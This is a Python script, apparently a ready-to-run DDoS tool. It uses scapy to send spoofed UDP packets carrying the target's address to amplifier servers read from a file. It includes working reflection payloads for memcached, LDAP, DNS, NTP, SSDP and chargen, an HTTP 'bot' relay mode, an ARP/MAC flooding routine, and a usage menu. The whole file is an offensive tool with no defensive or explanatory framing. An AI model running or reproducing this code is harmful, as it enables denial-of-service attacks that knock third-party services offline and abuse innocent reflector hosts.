# -*- coding: utf-8 -*-
from scapy.all import *
import sys, argparse, urllib2, threading, time, urllib2, re

print("""

·▄▄▄.▄▄ ·        ▄▄· ▪  ▄▄▄ .▄▄▄▄▄ ▄· ▄▌
▐▄▄·▐█ ▀. ▪     ▐█ ▌▪██ ▀▄.▀·•██  ▐█▪██▌
██▪ ▄▀▀▀█▄ ▄█▀▄ ██ ▄▄▐█·▐▀▀▪▄ ▐█.▪▐█▌▐█▪
██▌.▐█▄▪▐█▐█▌.▐▌▐███▌▐█▌▐█▄▄▌ ▐█▌· ▐█▀·.
▀▀▀  ▀▀▀▀  ▀█▄▀▪·▀▀▀ ▀▀▀ ▀▀▀  ▀▀▀   ▀ • 

""")


parser = argparse.ArgumentParser()
parser.add_argument("-A", help="Type attack")
parser.add_argument("-T", help="Target")
parser.add_argument("-F", help="File amplification")
parser.add_argument("-Thread", default=10, help="Thread")
args = parser.parse_args()

def deny(data, port):
  global servers
  global current
  global target
  amp = servers[current] 
  current = current + 1
  amp = re.sub("^\s+|\n|\r|\s+$", '', amp)
  packet = IP(dst=amp,src=target)/UDP(sport=80, dport=port)/Raw(load=data)
  send(packet, verbose=0, loop=1)



def returnbot():
  global servers
  global current
  global target
  amp = servers[current] 
  current = current + 1
  amp = amp.replace(' ', '')
  bot = amp+target
  urllib2.urlopen(urllib2.Request(str(bot))).read()



def macflood():
  global target
  while 1:
    sendp(Ether(src=RandMAC(), dst=target)/ARP(op=2, psrc="0.0.0.0", hwdst=target)/Padding(load="X"*18))


print("""

{1} Memcrashed:    -A 1 -T xx.xx.xx.xx -F bot.txt  -Thread 10    
{2} LDAP:          -A 2 -T xx.xx.xx.xx -F bot.txt  -Thread 10
{3} DNS:           -A 3 -T xx.xx.xx.xx -F bot.txt  -Thread 10
{4} NTP:           -A 4 -T xx.xx.xx.xx -F bot.txt  -Thread 10
{5} SSDP:          -A 5 -T xx.xx.xx.xx -F bot.txt  -Thread 10
{6} Chargen:       -A 6 -T xx.xx.xx.xx -F bot.txt  -Thread 10
{7} Server:        -A 7 -T xx.xx.xx.xx -F bot.txt  -Thread 10
{8} Mac-flood:     -A 8 -T FFFF.FFFF.FFFF          -Thread 10


  """)



attack = args.A
target = args.T
server = args.F
numthreads = int(args.Thread)


if(len(sys.argv) < 3) or (target == None) or (server == None) or (attack == None):
  print('You run the script without parameters')
  exit()

servers = []
current = 0
with open(server) as f:
    servers = f.readlines()


countserver = int(len(servers))
if(numthreads > countserver):
  print('You have entered a floor more than servers.')
  print('Servers: '+ str(countserver))
  exit(0)

ssdp    = 'M-SEARCH * HTTP/1.1\r\nHOST: %s:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n' % servers[current]

data    = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"

dnsreq  = "\xc4\x75\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\xff\x00\x01\x00\x00\x29\x23\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

chargen = "3221226219" * 16

ntp     = "\x17\x00\x02\x2a"+"\x00"*4


ldap =  "\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a"
ldap += "\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01"
ldap += "\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65"
ldap += "\x63\x74\x63\x6c\x61\x73\x73\x30\x00\x00"
ldap += "\x00\x30\x84\x00\x00\x00\x0a\x04\x08\x4e"
ldap += "\x65\x74\x6c\x6f\x67\x6f\x6e"


def threads(numthreads, arg1, arg2):
  threads = []
  for n in range(numthreads):
    thread = threading.Thread(target=deny, args=(arg1, arg2))
    thread.daemon = True
    thread.start()
    time.sleep(1)

def threads2(numthreads, types):
  threads = []
  for n in range(numthreads):
    thread = threading.Thread(target=types)
    thread.daemon = True
    thread.start()
    time.sleep(1)

    threads.append(thread)

if(attack == '1'):
  threads(numthreads, data, 11211)
elif(attack == '2'):
  threads(numthreads, ldap, 389)
elif(attack == '3'):
  threads(numthreads, dnsreq, 53)
elif(attack == '4'):
  threads(numthreads, ntp, 123)
elif(attack == '5'):
  threads(numthreads, ssdp, 1900)
elif(attack == '6'):
  threads(numthreads, chargen, 19)
elif(attack == '7'):
  threads2(numthreads, returnbot)
elif(attack == '8'):
  threads2(numthreads, macflood)
  
while True:
  time.sleep(2)
